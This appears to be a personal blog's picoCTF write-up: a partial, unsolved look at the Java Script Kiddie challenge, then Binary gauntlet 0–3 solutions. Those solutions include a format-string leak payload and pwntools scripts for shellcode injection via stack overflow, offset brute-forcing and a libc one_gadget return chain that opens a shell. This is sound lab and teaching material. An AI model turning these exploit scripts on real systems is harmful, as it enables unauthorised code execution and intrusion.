+++
date = '2026-04-29'
draft = false
title = 'Pico Java Script Kiddie 1 & 2 writeup'
ShowToc = true
tags = ["picoCTF", "web"]
+++

## Java Script Kiddie 1

We can enter some text in a little box.

We also have this javascript code, essentially:

```js
var bytes = [69, 36, 1, 151, 249....]; //These are actually fetched from /bytes
		

			function assemble_png(u_in){
				var LEN = 16;
				var key = "0000000000000000";
				var shifter;
				if(u_in.length == LEN){
					key = u_in;
				//so, we can set our own key if we input a 16 len thing
				}
				var result = [];
				for(var i = 0; i < LEN; i++){
					shifter = key.charCodeAt(i) - 48;
					//For each char in key, remove 48 from the ascii 
					for(var j = 0; j < (bytes.length / LEN); j ++){
					   ///working in chunks of 16 bytes
						result[(j * LEN) + i] = bytes[(((j + shifter) * LEN) % bytes.length) + i]
					}
				}
				while(result[result.length-1] == 0){
					result = result.slice(0,result.length-1);
					///just remove the last character if it's null
				}
				document.getElementById("Area").src = "data:image/png;base64," + btoa(String.fromCharCode.apply(null, new Uint8Array(result)));
				return false;
			}
```

But what are we supposed to do? We already have the bytes, the result is clearly wrong, I don't get it. 

I guess we could apply this with different keys until the first third bytes are a png/jpg header?

## Java Script Kiddie 2

## Binary gauntlet 0

For this one I just sent `%1$p.%2$p.%3$p.%4$p.%5$p.%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p.%19$p.%20$p.%21$p.%22$p.%23$p.%24$p.%25$p.%26$p.%27$p.%28$p.%29$p.%30$p.%31$p.%32$p.%33$p.%34$p.%35$p.%36$p.%37$p.%38$p.%39$p.%40$p.%41$p.%42$p.%43$p.%44$p.%45$p.%46$p.%47$p.%48$p.%49$p.%50$p.%51$p.%52$p.%53$p.%54$p.%55$p.%56$p.%57$p.%58$p.%59$p.%60$p.%61$p.%62$p.%63$p.%64$p.%65$p.%66$p.%67$p.%68$p.%69$p.%70$p.%71$p.%72$p.%73$p.%74$p.%75$p.%76$p.%77$p.%78$p.%79$p.%80$p.%81$p.%82$p.%83$p.%84$p.%85$p.%86$p.%87$p.%88$p.%89$p.%90$p.%91$p.%92$p.%93$p.%94$p.%95$p.%96$p.%97$p.%98$p.%99$p.%100$p.%101$p.%102$p.%103$p.%104$p.%105$p.%106$p.%107$p.%108$p.%109$p.%110$p.%111$p.%112$p.%113$p.%114$p.%115$p.%116$p.%117$p.%118$p.%119$p.%120$p.%121$p.%122$p.%123$p.%124$p.%125$p.%126$p.%127$p.%128$p.%129$p.%130$p.%131$p.%132$p.%133$p.%134$p.%135$p.%136$p.%137$p.%138$p.%139$p.%140$p.%141$p.%142$p.%143$p.%144$p.%145$p.%146$p.%147$p.%148$p.%149$p.%150$p` twice, and I got the flag.

![challenge-screenshot](flag0.png#center)

## Binary gauntlet 1 

NX and PIE are both disabled, and we get the location of `dest` on the stack. So, the stack is executable, and we have a buffer overflow. I actually had to look for a hint for this, I haven't seen an NX disabled challenge in so long it hadn't even crossed my mind.

And since I forgot that for `shellcraft.sh()` we need to specify the `context.arch = 'amd64'` it took me another half hour.. haha.

Script:

```py
from pwn import *
elf = ELF('/home/kali/Downloads/gauntlet')
p=elf.process()
context.arch = 'amd64'

cyberedu = 'wily-courier.picoctf.net:59013'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

dest = p.recvline()
dest = int(dest, 16)
p.sendline()

#we're going to write shellcode in dest.

shell = asm(shellcraft.sh())
print(len(shell)) #44
shell = shell.ljust(120, b'\x90')

#104 + 8(s) + 8(rbp) + dest

payload = shell
payload += p64(dest)
p.sendline(payload)
          
p.interactive()
```

Flag:

![challenge-screenshot](flag1.png#center)
       
## Binary gauntlet 2

Same thing, but we don't get the address of dest in our face this time. But, it looks like the 6th address (locally) is `$rsp + 0x8`. Ida tells us that dest is at `char dest[104]; // [rsp+10h]`.

So, we just need to add `0x10 - 0x8` to our address, which is 8. I added it, tested it, but apparently I was off by 0x100. It didn't work. Then, I set dest to "gaga", searched for "gaga", and found I was off by another 0x88.

![challenge-screenshot](test.png#center)

This time, it worked!

![challenge-screenshot](work2.png#center)

But not remotely. So, let's just guess the offest, haha...

```py
from pwn import *
elf = ELF('/home/kali/Downloads/gauntlet')
p=elf.process()
context.arch = 'amd64'
import time
cyberedu = 'wily-courier.picoctf.net:56417'

ip, port = cyberedu.split(':')
port = int(port)

#gdb.attach(p, gdbscript="b * 0x40071C")

def try_offset(i):
    try:
        p = remote(ip, port)
        p.sendline(b"%6$p")
        dest = p.recvline()
        dest = int(dest, 16)
    
        dest = dest - 0x100 - i
        #print(f"hello i am dest i am {hex(dest)}")
        shell = asm(shellcraft.sh())
        shell = shell.ljust(120, b'\x90')

        #108 + 4(gid) + 8(stream) + 8(s)

        payload = shell
        payload += p64(dest)
        p.sendline(payload)
        p.sendline(b'cat flag.txt')
        data = p.recvall(timeout=3)
        print(f"data for offset {i}: {data}")
        if b'Segmentation' not in data and b'Illegal' not in data:
            log.failure(f"INTERESTING AT {hex(i)}!")
            
        
    except EOFError:
        pass


for i in range(0x0, 0x101):
    try_offset(i)
```

And, at offset `0x58` which is `88` in decimal, so the *exact* same one as locally except in different bases, it worked.

![challenge-screenshot](flag2.png#center)

## Binary gauntlet 3

This time, we get the `libc-2.27.so`, thank god no more NX!!

I already tried to solve the 1 challenge like this, before realising it was NX, and I couldn't finish because I couldn't find the libc version. But, to actually run it locally using that, we also need the linker.

This pissed me off so much I made a guide for patching it [here](irinasusca.github.io/writeup-blog/fixpwnversion).

After that, we can calculate the offset from the second value to base of libc. Then, we can use the gadgets from libc, since they dont contain null bytes that break our ROP chain on `strcpy`.

BUT, that many libc addresses, which all contain null bytes, kept breaking the chain! So, I switched to one_gadget, and the third try - success!

![challenge-screenshot](work3.png#center)

And, remotely first try, the third flag!

![challenge-screenshot](flag3.png#center)

Script:

```py
from pwn import *
elf = ELF('./gauntlet')

context.arch = 'amd64'

cyberedu = 'wily-courier.picoctf.net:64863'

ip, port = cyberedu.split(':')
port = int(port)
#gdb.attach(p, gdbscript="b * 0x40071C")

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()

p.sendline(b"%2$p")
dest = p.recvline()
dest = int(dest, 16)

libc_offset = 0x3ed8d0
libc = dest - libc_offset

binsh = 0x1b3e9a + libc
system = 0x4f440 + libc

pop_rdi_ret = 0x8f989 + libc
ret = 0xc7c02 + libc

one_gadget = libc + 0x4f302

print(f"libc is at {hex(libc)} and {hex(binsh)} and {hex(system)} and {hex(pop_rdi_ret)} and {hex(ret)}")

#we're going to write shellcode in dest.

#104 + 8(s) + 8(rbp) + dest

payload = ( b"\x90"*120 +
            p64(one_gadget) 
          #  p64(binsh) + 
          #  p64(ret) +
          #  p64(system)
            )
            
p.sendline(payload)
          
p.interactive()
```



